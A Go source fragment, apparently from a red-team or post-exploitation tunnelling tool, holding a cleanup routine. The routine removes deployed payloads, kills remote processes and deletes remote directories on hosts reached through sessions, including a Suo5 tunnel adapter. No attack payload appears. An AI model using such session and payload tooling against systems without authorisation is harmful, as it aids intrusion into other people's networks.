	return nil
}

// Clean every layer even after one fails, but only confirm stopped after every
// owned layer has been accounted for. Missing sessions are an unknown result.
func (m *Manager) cleanupResources(ctx context.Context, id int64, p *Plan) error {
	var errs []error
	needsSession := p.RemotePID > 0 || p.RemoteDir != "" || p.PayloadPath != ""
	if needsSession {
		if sess, ok := m.sessions.Get(p.ViaSessionID); ok {
			if p.Adapter == AdapterSuo5 {
				errs = append(errs, m.removePayload(ctx, sess, p))
			} else {
				remoteErr := m.killRemote(ctx, sess, p)
				errs = append(errs, remoteErr)
				if remoteErr == nil && p.RemoteDir != "" {
					mk, err := randTag()
					if err == nil {
						var out string
						out, _, err = sess.Exec(ctx, p.host().RemoveDirCmd(p.RemoteDir, mk), probeTimeout)
						if err == nil && !strings.Contains(out, mk+"_OK") {
							err = fmt.Errorf("远端目录清理未确认")
						}
					}
					errs = append(errs, err)
				}
			}
		} else {
			errs = append(errs, fmt.Errorf("会话 %d 不在注册表，远端清理未确认", p.ViaSessionID))
		}
	}
	errs = append(errs, m.killServer(id, p))
	if p.StageToken != "" && m.stage != nil {
		m.stage.Delete(p.StageToken)
	}
	if p.AuthFile != "" {
		if err := os.Remove(p.AuthFile); err != nil && !errors.Is(err, os.ErrNotExist) {
			errs = append(errs, err)
		}
	}
	return errors.Join(errs...)
}
